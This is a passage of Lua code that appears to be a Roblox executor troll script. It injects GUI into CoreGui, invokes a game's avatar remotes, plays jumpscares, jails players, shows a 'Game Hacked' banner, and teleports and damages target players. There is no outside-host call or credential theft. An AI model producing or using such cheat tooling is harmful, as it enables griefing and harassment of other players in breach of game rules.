            textExtra.BackgroundTransparency = 1
            textExtra.Font = Enum.Font.GothamBold
            textExtra.TextScaled = true
            textExtra.TextStrokeTransparency = 0.2
            textExtra.TextStrokeColor3 = Color3.new(0, 0, 0)
            textExtra.TextColor3 = Color3.fromRGB(0, 180, 255)
            textExtra.Text = displayExtra
            textExtra.LayoutOrder = 2
            textExtra.Parent = gui
        end
    end
    pcall(apply)
    player.CharacterAdded:Connect(function()
        task.wait(0.4)
        pcall(apply)
    end)
end

local function EnviarMensagemChat(texto)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if canal then canal:SendAsync(texto) end
end

local function NomeCorresponde(alvoDigitado, nomeJogador)
    if not alvoDigitado or alvoDigitado == "" or not nomeJogador then return false end
    alvoDigitado = alvoDigitado:lower()
    nomeJogador = nomeJogador:lower()
    return nomeJogador:sub(1, #alvoDigitado) == alvoDigitado
end

local function TransformIntoGoner()
    pcall(function()
        local remotes = ReplicatedStorage:WaitForChild("Remotes", 5) or ReplicatedStorage:WaitForChild("RE", 5)
        if remotes and remotes:FindFirstChild("ChangeCharacterBody") then
            remotes.ChangeCharacterBody:InvokeServer(unpack({{
                116253341067642, 110703630520331, 119263803737569,
                99234191703566, 99948897896884, 0
            }}))
        end
        task.wait(3)
        local player = game.Players.LocalPlayer
        local humanoid = (player.Character or player.CharacterAdded:Wait()):WaitForChild("Humanoid")
        local animation = Instance.new("Animation")
        animation.AnimationId = "rbxassetid://4686925579"
        humanoid:LoadAnimation(animation):Play()
        humanoid.WalkSpeed = 0
        task.wait(2)
        local function ApplyGonerAppearance()
            if remotes and remotes:FindFirstChild("Wear") then
                local wearRemote = remotes.Wear
                for _, accessory in ipairs(humanoid:GetAppliedDescription():GetAccessories(true)) do
                    if accessory.AssetId then wearRemote:InvokeServer(unpack({tonumber(accessory.AssetId)})) end
                end
                task.wait()
                wearRemote:InvokeServer(unpack({17771175724}))
                wearRemote:InvokeServer(unpack({17822722698}))
                wearRemote:InvokeServer(unpack({17822749561}))
                wearRemote:InvokeServer(unpack({17772174303}))
                wearRemote:InvokeServer(unpack({17770317484}))
                wearRemote:InvokeServer(unpack({4586060885}))
                wearRemote:InvokeServer(unpack({6913613757}))
            end
            if remotes and remotes:FindFirstChild("ChangeBodyColor") then
                remotes.ChangeBodyColor:FireServer(unpack({"Really black"}))
            end
            task.wait(0.2)
            if remotes and remotes:FindFirstChild("ApplyEmmiter") then
                remotes.ApplyEmmiter:InvokeServer(18635845425, "087SmokeBlack")
            end
        end
        task.wait(0.2)
        local backpack = game.Players.LocalPlayer.Backpack
        local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
        local punchTool = Instance.new("Tool")
        punchTool.Name = "Soco"
        punchTool.RequiresHandle = true
        punchTool.CanBeDropped = false
        punchTool.Parent = backpack
        local handle = Instance.new("Part")
        handle.Name = "Handle"
        handle.Size = Vector3.new(1,1,1)
        handle.Transparency = 1
        handle.CanCollide = false
        handle.Anchored = false
        handle.Parent = punchTool
        punchTool.Equipped:Connect(function()
            punchTool.Activated:Connect(function()
                local characterHumanoid = character:FindFirstChildOfClass("Humanoid")
                if not characterHumanoid then return end
                local animator = characterHumanoid:FindFirstChild("Animator")
                if not animator then animator = Instance.new("Animator"); animator.Parent = characterHumanoid end
                local punchAnimation = Instance.new("Animation")
                punchAnimation.AnimationId = "rbxassetid://846744780"
                local animationTrack = animator:LoadAnimation(punchAnimation)
                animationTrack.Looped = false
                animationTrack:Play()
            end)
        end)
        ApplyGonerAppearance()
        task.wait(1)
        local resetHumanoid = (player.Character or player.CharacterAdded:Wait()):WaitForChild("Humanoid")
        for _, track in pairs(resetHumanoid:GetPlayingAnimationTracks()) do track:Stop() end
        resetHumanoid.WalkSpeed = 16
    end)
end

local function CoolkidAvatar()
    pcall(function()
        local remotes = ReplicatedStorage:WaitForChild("Remotes", 5) or ReplicatedStorage:WaitForChild("RE", 5)
        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        if not Humanoid or not remotes then return end
        local Desc = Humanoid:GetAppliedDescription()
        local WearRemote = remotes:FindFirstChild("Wear")
        if WearRemote then
            for _, accessory in ipairs(Desc:GetAccessories(true)) do
                if accessory.AssetId then WearRemote:InvokeServer(unpack({tonumber(accessory.AssetId)})) end
            end
            task.wait()
            remotes.ChangeCharacterBody:InvokeServer(unpack({{0, 0, 0, 0, 0, 0}}))
            WearRemote:InvokeServer(18554114295)
            WearRemote:InvokeServer(3164473649)
            remotes.ChangeBodyColor:FireServer("Really red")
            WearRemote:InvokeServer(6093233760)
        end
    end)
end

local animeConn
local function StartAnimeJumpscare()
    pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "AnimeJumpscare"
        gui.ResetOnSpawn = false
        gui.IgnoreGuiInset = true
        gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        gui.DisplayOrder = 2147483647
        gui.Parent = CoreGui
        local whiteBackground = Instance.new("Frame")
        whiteBackground.Size = UDim2.fromScale(1, 1)
        whiteBackground.Position = UDim2.fromScale(0, 0)
        whiteBackground.BackgroundColor3 = Color3.new(1, 1, 1)
        whiteBackground.BorderSizePixel = 0
        whiteBackground.ZIndex = 999999
        whiteBackground.Parent = gui
        local blocker = Instance.new("TextButton")
        blocker.Size = UDim2.fromScale(1, 1)
        blocker.BackgroundTransparency = 1
        blocker.Text = ""
        blocker.AutoButtonColor = false
        blocker.Modal = true
        blocker.ZIndex = whiteBackground.ZIndex + 1
        blocker.Parent = whiteBackground
        local image = Instance.new("ImageLabel")
        image.AnchorPoint = Vector2.new(0.5, 0.5)
        image.Position = UDim2.fromScale(0.5, 0.5)
        image.Size = UDim2.fromScale(1, 1)
        image.BackgroundTransparency = 1
        image.Image = "rbxassetid://84838094344701"
        image.ZIndex = blocker.ZIndex + 1
        image.Parent = gui
        local sound1 = Instance.new("Sound")
        sound1.SoundId = "rbxassetid://82719020266339"
        sound1.Volume = 1
        sound1.Parent = gui
        local sound2 = Instance.new("Sound")
        sound2.SoundId = "rbxassetid://134884767490882"
        sound2.Volume = 0.8
        sound2.Looped = true
        sound2.Parent = workspace
        task.delay(2.8, function()
            if image.Parent then image.Image = "rbxassetid://95558068230459" end
        end)
        local t = 0
        if animeConn then animeConn:Disconnect() end
        animeConn = RunService.RenderStepped:Connect(function(dt)
            if not image.Parent then if animeConn then animeConn:Disconnect() end return end
            t = t + dt * 5
            image.Position = UDim2.fromScale(0.5 + math.sin(t * 7) * 0.02, 0.5 + math.cos(t * 8) * 0.02)
            image.Size = UDim2.fromScale(1 + math.sin(t * 8) * 0.1, 1 + math.sin(t * 8) * 0.1)
            image.Rotation = math.sin(t * 10) * 9
        end)
        sound1.Ended:Connect(function()
            if gui and gui.Parent then gui:Destroy() end
            sound2:Play()
        end)
        sound1:Play()
        local oldSky = Lighting:FindFirstChildOfClass("Sky")
        if oldSky then oldSky:Destroy() end
        local sky = Instance.new("Sky")
        sky.Name = "AnimeJumpscareSky"
        sky.Parent = Lighting
        local frames = {21076888,21076945,21077007,21077125,21077227,21077345,21077227,21077125,21077007,21076945}
        task.spawn(function()
            while sky and sky.Parent do
                for _, id in ipairs(frames) do
                    if not sky or not sky.Parent then break end
                    local asset = "rbxassetid://" .. id
                    sky.SkyboxBk = asset; sky.SkyboxDn = asset; sky.SkyboxFt = asset;
                    sky.SkyboxLf = asset; sky.SkyboxRt = asset; sky.SkyboxUp = asset
                    task.wait(0.1)
                end
            end
        end)
    end)
end

local function StopAnimeJumpscare()
    pcall(function()
        if animeConn then animeConn:Disconnect() end
        local gui = CoreGui:FindFirstChild("AnimeJumpscare")
        if gui then gui:Destroy() end
        for _, s in ipairs(workspace:GetChildren()) do
            if s:IsA("Sound") and s.SoundId == "rbxassetid://134884767490882" then
                s:Stop(); s:Destroy()
            end
        end
        local sky = Lighting:FindFirstChild("AnimeJumpscareSky")
        if sky then sky:Destroy() end
    end)
end

local function CreateAndManageJail(player)
    if not player or not player.Character then return false end
    local e = Workspace:FindFirstChild("Jail_" .. player.Name)
    if e then e:Destroy() end
    if JAILED_PLAYERS[player.Name] and JAILED_PLAYERS[player.Name].loop then
        task.cancel(JAILED_PLAYERS[player.Name].loop)
    end
    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
    local hum = player.Character:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return false end
    local m = Instance.new("Model", Workspace)
    m.Name = "Jail_" .. player.Name
    local s = 8
    local p = hrp.Position
    local t = {
        Base = Instance.new("Part", m),
        Roof = Instance.new("Part", m),
        Wall1 = Instance.new("Part", m),
        Wall2 = Instance.new("Part", m),
        Wall3 = Instance.new("Part", m),
        Wall4 = Instance.new("Part", m)
    }
    t.Base.Size = Vector3.new(s, 0.5, s)
    t.Base.Position = p - Vector3.new(0, hum.HipHeight + 0.25, 0)
    t.Roof.Size = Vector3.new(s, 0.5, s)
    t.Roof.Position = t.Base.Position + Vector3.new(0, s, 0)
    t.Wall1.Size = Vector3.new(0.5, s, s)
    t.Wall1.Position = t.Base.Position + Vector3.new(s / 2, s / 2, 0)
    t.Wall2.Size = Vector3.new(0.5, s, s)
    t.Wall2.Position = t.Base.Position - Vector3.new(s / 2, -s / 2, 0)
    t.Wall3.Size = Vector3.new(s, s, 0.5)
    t.Wall3.Position = t.Base.Position + Vector3.new(0, s / 2, s / 2)
    t.Wall4.Size = Vector3.new(s, s, 0.5)
    t.Wall4.Position = t.Base.Position - Vector3.new(0, -s / 2, s / 2)
    for _, v in pairs(t) do
        v.Anchored = true
        v.CanCollide = true
        v.Material = Enum.Material.Neon
        v.Color = Color3.fromRGB(0, 200, 255)
        v.Transparency = 0.6
    end
    if player == LocalPlayer then
        local l = task.spawn(function()
            local c = t.Base.Position + Vector3.new(0, hum.HipHeight, 0)
            while JAILED_PLAYERS[player.Name] and player.Parent and player.Character and player.Character.Parent do
                local h = player.Character:FindFirstChild("HumanoidRootPart")
                if h and (h.Position - c).Magnitude > (s / 2) - 1 then h.CFrame = CFrame.new(c) end
                task.wait(0.1)
            end
        end)
        JAILED_PLAYERS[player.Name] = { loop = l }
    else
        JAILED_PLAYERS[player.Name] = {}
    end
    return true
end

local function RemoveJail(player)
    if not player then return end
    local e = Workspace:FindFirstChild("Jail_" .. player.Name)
    if e then e:Destroy() end
    if JAILED_PLAYERS[player.Name] then
        if JAILED_PLAYERS[player.Name].loop then task.cancel(JAILED_PLAYERS[player.Name].loop) end
        JAILED_PLAYERS[player.Name] = nil
    end
end

local function CustomJumpscare(imageId, audioId)
    local jumpscareGui = Instance.new("ScreenGui")
    jumpscareGui.Name = "CustomJumpscare"
    jumpscareGui.IgnoreGuiInset = true
    jumpscareGui.ResetOnSpawn = false
    jumpscareGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    jumpscareGui.DisplayOrder = 999999
    pcall(function() jumpscareGui.Parent = CoreGui end)
    if not jumpscareGui.Parent then jumpscareGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
    local image = Instance.new("ImageLabel")
    image.Size = UDim2.new(1.2, 0, 1.2, 0)
    image.Position = UDim2.new(-0.1, 0, -0.1, 0)
    image.BackgroundTransparency = 1
    image.Image = imageId or "rbxassetid://108753859505348"
    image.ZIndex = 999999
    image.Parent = jumpscareGui
    local sound = Instance.new("Sound")
    sound.SoundId = audioId or "rbxassetid://18967004856"
    sound.Volume = 10
    sound.Parent = SoundService
    local shaking = true
    task.spawn(function()
        while shaking do
            local offsetX = math.random(-10, 10)
            local offsetY = math.random(-10, 10)
            image.Position = UDim2.new(-0.1, offsetX, -0.1, offsetY)
            task.wait(0.02)
        end
    end)
    image.Visible = true
    sound:Play()
    task.delay(2.5, function()
        shaking = false
        jumpscareGui:Destroy()
        sound:Destroy()
    end)
end

local function Jumpscare()
    CustomJumpscare("rbxassetid://108753859505348", "rbxassetid://18967004856")
end

local function CoolkidEffect(targetPlayer)
    if not targetPlayer then return end
    local sky = Instance.new("Sky")
    sky.SkyboxBk = "rbxassetid://100048062301288"
    sky.SkyboxDn = "rbxassetid://100048062301288"
    sky.SkyboxFt = "rbxassetid://100048062301288"
    sky.SkyboxLf = "rbxassetid://100048062301288"
    sky.SkyboxRt = "rbxassetid://100048062301288"
    sky.SkyboxUp = "rbxassetid://100048062301288"
    sky.Parent = game.Lighting
    local decalId = "rbxassetid://100048062301288"
    local function applyDecals(part)
        if part:IsA("BasePart") then
            for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                local decal = Instance.new("Decal")
                decal.Face = face
                decal.Texture = decalId
                decal.Parent = part
            end
        end
    end
    for _, part in pairs(workspace:GetDescendants()) do applyDecals(part) end
    workspace.DescendantAdded:Connect(function(descendant) applyDecals(descendant) end)
    local imageId = "rbxassetid://100048062301288"
    local function criarParticula(parte)
        local particle = Instance.new("ParticleEmitter")
        particle.Texture = imageId
        particle.Rate = 10
        particle.Lifetime = NumberRange.new(1)
        particle.Speed = NumberRange.new(2, 5)
        particle.Size = NumberSequence.new(1)
        particle.Rotation = NumberRange.new(0, 360)
        particle.RotSpeed = NumberRange.new(10)
        particle.SpreadAngle = Vector2.new(360, 360)
        particle.Parent = parte
    end
    local function aplicarParticulas(character)
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") and not part:FindFirstChildOfClass("ParticleEmitter") then criarParticula(part) end
        end
    end
    if targetPlayer.Character then aplicarParticulas(targetPlayer.Character) end
    targetPlayer.CharacterAdded:Connect(aplicarParticulas)
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "c00lkidTopBar"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    local topBar = Instance.new("Frame", gui)
    topBar.BackgroundColor3 = Color3.new(0, 0, 0)
    topBar.Size = UDim2.new(1, 100, 0, 25)
    topBar.Position = UDim2.new(0, -50, 0, 0)
    topBar.BorderSizePixel = 0
    topBar.ZIndex = 2
    local title = Instance.new("TextLabel", topBar)
    title.Size = UDim2.new(1, 0, 1, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Game Hacked"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Font = Enum.Font.SourceSans
    title.TextSize = 20
    title.TextStrokeTransparency = 0.5
    title.TextStrokeColor3 = Color3.new(0, 0, 0)
    title.ZIndex = 3
    local Sound = Instance.new("Sound")
    Sound.SoundId = "rbxassetid://99986264226275"
    Sound.Looped = false
    Sound.Parent = workspace
    local function playSoundWithRandomSettings()
        Sound.Volume = math.random(1, 3)
        Sound.PlaybackSpeed = math.random(20, 30) / 100
        Sound:Play()
    end
    playSoundWithRandomSettings()
    Sound.Ended:Connect(playSoundWithRandomSettings)
end

local function FloppaRain()
    FloppaRunning = true
    local sky = Instance.new("Sky")
    sky.SkyboxBk = "rbxassetid://123446364161879"
    sky.SkyboxDn = "rbxassetid://123446364161879"
    sky.SkyboxFt = "rbxassetid://123446364161879"
    sky.SkyboxLf = "rbxassetid://123446364161879"
    sky.SkyboxRt = "rbxassetid://123446364161879"
    sky.SkyboxUp = "rbxassetid://123446364161879"
    sky.Parent = game.Lighting
    task.spawn(function()
        while FloppaRunning do
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://8772968188"
            sound.Volume = 1
            sound.Parent = workspace
            sound:Play()
            task.wait(5)
        end
    end)
    task.wait(1)
    local floppaTemplate = Instance.new("Part")
    floppaTemplate.Size = Vector3.new(2,2,2)
    floppaTemplate.Anchored = false
    floppaTemplate.CanCollide = true
    local textureId = "rbxassetid://123446364161879"
    local function ApplyFloppaTexture(part)
        for _, faceName in pairs({"Front","Back","Left","Right","Top","Bottom"}) do
            local decal = Instance.new("Decal")
            decal.Texture = textureId
            decal.Face = Enum.NormalId[faceName]
            decal.Parent = part
        end
    end
    local function OnFloppaTouch(part)
        part.Touched:Connect(function(hit)
            local humanoid = hit.Parent:FindFirstChildOfClass("Humanoid")
            if humanoid then humanoid:TakeDamage(10) end
        end)
    end
    local floppaCount = 0
    local MAX_FLOPPAS = 80
    while FloppaRunning do
        if floppaCount < MAX_FLOPPAS then
            for i = 1, 5 do
                local floppa = floppaTemplate:Clone()
                floppa.Position = Vector3.new(math.random(-250,250), 100, math.random(-250,250))
                ApplyFloppaTexture(floppa)
                OnFloppaTouch(floppa)
                floppa.Parent = workspace
                Debris:AddItem(floppa, 8)
                floppaCount = floppaCount + 1
            end
        end
        task.wait(0.5)
    end
end

local function StopFloppa()
    FloppaRunning = false
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj:IsA("Part") and obj.Size == Vector3.new(2,2,2) then
            local hasTexture = false
            for _, child in ipairs(obj:GetChildren()) do
                if child:IsA("Decal") then hasTexture = true; break end
            end
            if hasTexture then pcall(function() obj:Destroy() end) end
        end
    end
    local flopSky = game.Lighting:FindFirstChildOfClass("Sky")
    if flopSky then flopSky:Destroy() end
end

local function DomainExpansion(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHrp then return false end
    local originalCFrame = targetHrp.CFrame
    local domainCenter = Vector3.new(5000, 100, 5000)
    local savedLighting = {
        Brightness = Lighting.Brightness, Ambient = Lighting.Ambient,
        OutdoorAmbient = Lighting.OutdoorAmbient, FogEnd = Lighting.FogEnd,
        FogStart = Lighting.FogStart, FogColor = Lighting.FogColor,
        ClockTime = Lighting.ClockTime, ShadowSoftness = Lighting.ShadowSoftness,
    }
    local savedEffects = {}
    for _, eff in ipairs(Lighting:GetChildren()) do
        if eff:IsA("PostEffect") or eff:IsA("Sky") or eff:IsA("Atmosphere") then
            savedEffects[#savedEffects + 1] = eff:Clone()
            eff:Destroy()
        end
    end
    local sg = Instance.new("ScreenGui", CoreGui)
    sg.ResetOnSpawn = false
    sg.DisplayOrder = 999999
    sg.IgnoreGuiInset = true
    local bg = Instance.new("Frame", sg)
    bg.Size = UDim2.new(2, 0, 2, 0)
    bg.Position = UDim2.new(-0.5, 0, -0.5, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0
    bg.BorderSizePixel = 0
    bg.ZIndex = 999
    local titleLabel = Instance.new("TextLabel", sg)
    titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
    titleLabel.Position = UDim2.new(0, 0, 0.4, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.TextColor3 = Color3.fromRGB(200, 0, 0)
    titleLabel.TextTransparency = 1
    titleLabel.Font = Enum.Font.Antique
    titleLabel.TextScaled = true
    titleLabel.Text = "Malevolent Shrine"
    titleLabel.ZIndex = 1000
    titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    titleLabel.TextStrokeTransparency = 0
    task.wait(0.8)
    targetHrp.CFrame = CFrame.new(domainCenter)
    Lighting.Brightness = 0.3
    Lighting.ClockTime = 0
    Lighting.ShadowSoftness = 1
    Lighting.Ambient = Color3.fromRGB(60, 0, 0)
    Lighting.OutdoorAmbient = Color3.fromRGB(40, 0, 0)
    Lighting.FogStart = 5
    Lighting.FogEnd = 60
    Lighting.FogColor = Color3.fromRGB(5, 0, 0)
    local domainSky = Instance.new("Sky", Lighting)
    domainSky.SkyboxBk = "rbxassetid://6444884337"
    domainSky.SkyboxDn = "rbxassetid://6444884337"
    domainSky.SkyboxFt = "rbxassetid://6444884337"
    domainSky.SkyboxLf = "rbxassetid://6444884337"
    domainSky.SkyboxRt = "rbxassetid://6444884337"
    domainSky.SkyboxUp = "rbxassetid://6444884337"
    local atm = Instance.new("Atmosphere", Lighting)
    atm.Density = 1; atm.Offset = 0
    atm.Color = Color3.fromRGB(30, 0, 0)
    atm.Decay = Color3.fromRGB(10, 0, 0)
    atm.Glare = 0; atm.Haze = 2.3
    local cc = Instance.new("ColorCorrectionEffect", Lighting)
    cc.Brightness = -0.04; cc.Contrast = 0.3
    cc.Saturation = -0.6
    cc.TintColor = Color3.fromRGB(255, 80, 80)
    local bloom = Instance.new("BloomEffect", Lighting)
    bloom.Intensity = 0.6; bloom.Size = 24; bloom.Threshold = 0.8
    local floor = Instance.new("Part")
    floor.Size = Vector3.new(300, 1, 300)
    floor.Anchored = true; floor.CanCollide = true
    floor.Material = Enum.Material.SmoothPlastic
    floor.Color = Color3.fromRGB(10, 3, 3)
    floor.CFrame = CFrame.new(domainCenter - Vector3.new(0, 3, 0))
    floor.Parent = workspace
    local texture = Instance.new("Texture", floor)
    texture.Texture = "rbxassetid://74258839"
    texture.Color3 = Color3.fromRGB(80, 0, 0)
    texture.Transparency = 0.85
    texture.StudsPerTileU = 6; texture.StudsPerTileV = 6
    texture.Face = Enum.NormalId.Top
    local sphere = Instance.new("Part")
    sphere.Shape = Enum.PartType.Ball
    sphere.Size = Vector3.new(1, 1, 1)
    sphere.Anchored = true; sphere.CanCollide = false
    sphere.CastShadow = false
    sphere.Material = Enum.Material.SmoothPlastic
    sphere.Color = Color3.fromRGB(0, 0, 0)
    sphere.Transparency = 0
    sphere.Position = domainCenter
    sphere.Parent = workspace
    local sphereInner = Instance.new("Part")
    sphereInner.Shape = Enum.PartType.Ball
    sphereInner.Size = Vector3.new(1, 1, 1)
    sphereInner.Anchored = true; sphereInner.CanCollide = false
    sphereInner.CastShadow = false
    sphereInner.Material = Enum.Material.Neon
    sphereInner.Color = Color3.fromRGB(120, 0, 0)
    sphereInner.Transparency = 0.92
    sphereInner.Position = domainCenter
    sphereInner.Parent = workspace
    TweenService:Create(bg, TweenInfo.new(1.5), {BackgroundTransparency = 1}):Play()
    task.delay(0.5, function()
        TweenService:Create(titleLabel, TweenInfo.new(1), {TextTransparency = 0}):Play()
        task.delay(2.5, function()
            TweenService:Create(titleLabel, TweenInfo.new(1.2), {TextTransparency = 1}):Play()
        end)
    end)
    task.spawn(function()
        for i = 1, 120, 2 do
            if sphere and sphere.Parent then
                sphere.Size = Vector3.new(i, i, i)
                sphereInner.Size = Vector3.new(i * 0.97, i * 0.97, i * 0.97)
            end
            task.wait(0.015)
        end
    end)
    task.wait(1.5)
    local playerLookVector = originalCFrame.LookVector
    local flatLook = Vector3.new(playerLookVector.X, 0, playerLookVector.Z).Unit
    local shrineOffset = flatLook * 20
    local shrineAssets = game:GetObjects("rbxassetid://16639433873")
    local shrine
    if shrineAssets and #shrineAssets > 0 then
        shrine = shrineAssets[1]
        shrine.Parent = workspace
        local p = shrine.PrimaryPart or shrine:FindFirstChildWhichIsA("BasePart")
        if p then
            shrine.PrimaryPart = p
            local shrinePos = domainCenter + shrineOffset + Vector3.new(0, -2, 0)
            shrine:SetPrimaryPartCFrame(CFrame.lookAt(shrinePos, domainCenter + Vector3.new(0, shrinePos.Y - domainCenter.Y, 0)))
        end
        local coresByName = {
            Skull = Color3.fromRGB(220, 200, 180), Horn = Color3.fromRGB(180, 160, 140),
            Shrine = Color3.fromRGB(60, 40, 40), Roof1 = Color3.fromRGB(40, 20, 20),
            Roof2 = Color3.fromRGB(40, 20, 20), Roof3 = Color3.fromRGB(40, 20, 20),
            Teethonroof = Color3.fromRGB(220, 200, 180),
            Mouth1 = Color3.fromRGB(200, 10, 10), Mouth2 = Color3.fromRGB(200, 10, 10),
            Thingy = Color3.fromRGB(180, 5, 5), ceiling = Color3.fromRGB(30, 15, 15),
        }
        for _, v in ipairs(shrine:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Anchored = true; v.CanCollide = false
                v.Material = Enum.Material.SmoothPlastic
                v.Color = coresByName[v.Name] or Color3.fromRGB(50, 25, 25)
            end
            if v:IsA("SurfaceAppearance") then v:Destroy() end
            if v:IsA("ParticleEmitter") then v.Enabled = true end
            if v:IsA("Sound") then v.Parent = workspace; v:Play() end
        end
    end
    local assets = game:GetObjects("rbxassetid://18618934824")
    local model, fxPart
    if assets and #assets > 0 then
        model = assets[1]
        model.Parent = workspace
        fxPart = model:FindFirstChild("DomainExpansionFX", true)
        if fxPart then
            fxPart.Anchored = true; fxPart.CanCollide = false
            fxPart.CFrame = CFrame.new(domainCenter)
            for _, v in ipairs(fxPart:GetDescendants()) do
                if v:IsA("ParticleEmitter") then v.Enabled = true end
            end
        end
        local starterPack = model:FindFirstChild("StarterPack", true)
        if starterPack then
            for _, v in ipairs(starterPack:GetDescendants()) do
                if v:IsA("Sound") then v.Parent = workspace; v:Play() end
            end
        end
    end
    local lightPart = Instance.new("Part")
    lightPart.Size = Vector3.new(1,1,1); lightPart.Anchored = true
    lightPart.CanCollide = false; lightPart.Transparency = 1
    lightPart.Position = domainCenter + Vector3.new(0, 8, 0)
    lightPart.Parent = workspace
    local redLight = Instance.new("PointLight", lightPart)
    redLight.Color = Color3.fromRGB(200, 0, 0)
    redLight.Brightness = 10; redLight.Range = 80
    local lightPart2 = Instance.new("Part")
    lightPart2.Size = Vector3.new(1,1,1); lightPart2.Anchored = true
    lightPart2.CanCollide = false; lightPart2.Transparency = 1
    lightPart2.Position = domainCenter + Vector3.new(0, -1, 0)
    lightPart2.Parent = workspace
    local darkLight = Instance.new("PointLight", lightPart2)
    darkLight.Color = Color3.fromRGB(100, 0, 0)
    darkLight.Brightness = 5; darkLight.Range = 60
    task.spawn(function()
        while lightPart and lightPart.Parent do
            TweenService:Create(redLight, TweenInfo.new(0.4), {Brightness = 15}):Play()
            TweenService:Create(darkLight, TweenInfo.new(0.4), {Brightness = 8}):Play()
            task.wait(0.4)
            TweenService:Create(redLight, TweenInfo.new(0.4), {Brightness = 6}):Play()
            TweenService:Create(darkLight, TweenInfo.new(0.4), {Brightness = 2}):Play()
            task.wait(0.4)
        end
    end)
    local slashRunning = true
    task.spawn(function()
        local hue = 0
        while slashRunning do
            for i = 1, 10 do
                task.spawn(function()
                    local slash = Instance.new("Part")
                    slash.Size = Vector3.new(0.12, math.random(5, 16), 0.12)
                    slash.Anchored = true; slash.CanCollide = false
                    slash.Material = Enum.Material.Neon
                    slash.Color = Color3.fromRGB(math.random(220, 255), math.random(0, 40), 0)
                    slash.Transparency = 0
                    local angle = (i / 10) * math.pi * 2 + (hue * 0.1)
                    local radius = math.random(4, 25)
                    local height = math.random(-2, 10)
                    slash.CFrame = CFrame.new(
                        domainCenter.X + math.cos(angle) * radius,
                        domainCenter.Y + height,
                        domainCenter.Z + math.sin(angle) * radius
                    ) * CFrame.Angles(
                        math.random(-15, 15) * 0.1,
                        math.random(-15, 15) * 0.1,
                        math.random(-15, 15) * 0.1
                    )
                    slash.Parent = workspace
                    local trail = Instance.new("PointLight", slash)
                    trail.Color = Color3.fromRGB(255, 20, 0)
                    trail.Brightness = 3; trail.Range = 10
                    TweenService:Create(slash, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {Transparency = 1}):Play()
                    task.delay(0.15, function() slash:Destroy() end)
                end)
            end
            hue = hue + 1
            task.wait(0.2)
        end
    end)
    local ashPart = Instance.new("Part")
    ashPart.Size = Vector3.new(1,1,1); ashPart.Anchored = true
    ashPart.CanCollide = false; ashPart.Transparency = 1
    ashPart.Position = domainCenter + Vector3.new(0, 2, 0)
    ashPart.Parent = workspace
    local ashEmitter = Instance.new("ParticleEmitter", ashPart)
    ashEmitter.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 0, 0)),
    })
    ashEmitter.LightEmission = 0.3; ashEmitter.LightInfluence = 0.8
    ashEmitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.5), NumberSequenceKeypoint.new(1, 0)})
    ashEmitter.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.2), NumberSequenceKeypoint.new(1, 1)})
    ashEmitter.Lifetime = NumberRange.new(3, 6)
    ashEmitter.Rate = 60; ashEmitter.Speed = NumberRange.new(2, 8)
    ashEmitter.SpreadAngle = Vector2.new(180, 180)
    ashEmitter.RotSpeed = NumberRange.new(-45, 45)
    ashEmitter.Rotation = NumberRange.new(0, 360)
    local damageRunning = true
    task.spawn(function()
        while damageRunning do
            local char = targetPlayer.Character
            if char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum and hum.Health > 0 then hum:TakeDamage(5) end
            end
            task.wait(0.8)
        end
    end)
    task.delay(8, function()
        slashRunning = false
        damageRunning = false
        ashEmitter.Enabled = false
        if fxPart then
            for _, v in ipairs(fxPart:GetDescendants()) do
                if v:IsA("ParticleEmitter") then v.Enabled = false end
            end
        end
        TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
        task.wait(1)
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            targetPlayer.Character.HumanoidRootPart.CFrame = originalCFrame
        end
        Lighting.Brightness = savedLighting.Brightness
        Lighting.Ambient = savedLighting.Ambient
        Lighting.OutdoorAmbient = savedLighting.OutdoorAmbient
        Lighting.FogEnd = savedLighting.FogEnd
        Lighting.FogStart = savedLighting.FogStart
        Lighting.FogColor = savedLighting.FogColor
        Lighting.ClockTime = savedLighting.ClockTime
        Lighting.ShadowSoftness = savedLighting.ShadowSoftness
        if domainSky and domainSky.Parent then domainSky:Destroy() end
        if atm and atm.Parent then atm:Destroy() end
        if cc and cc.Parent then cc:Destroy() end
        if bloom and bloom.Parent then bloom:Destroy() end
        for _, eff in ipairs(savedEffects) do eff.Parent = Lighting end
        task.spawn(function()
            for i = 120, 0, -2 do
                if sphere and sphere.Parent then
                    sphere.Size = Vector3.new(i, i, i)
                    sphereInner.Size = Vector3.new(i * 0.97, i * 0.97, i * 0.97)
                end
                task.wait(0.015)
            end
